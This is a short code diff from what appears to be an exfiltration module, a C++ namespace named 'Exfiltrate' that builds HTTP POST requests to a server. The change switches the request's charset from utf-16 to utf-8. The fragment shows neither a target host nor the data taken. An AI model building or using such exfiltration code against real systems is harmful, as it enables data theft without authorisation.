@@ -57,7 +57,7 @@ namespace Exfiltrate
 		LPCWSTR postBody = tmp1.c_str();
 		std::wstring postData = postBody;
 
-		std::wstring headers = L"Content-Type: application/x-www-form-urlencoded; charset=utf-16";
+		std::wstring headers = L"Content-Type: application/x-www-form-urlencoded; charset=utf-8";
 
 		std::wstring tmp2 = std::wstring(httpServerP.begin(), httpServerP.end());
 		LPCWSTR httpServer = tmp2.c_str();
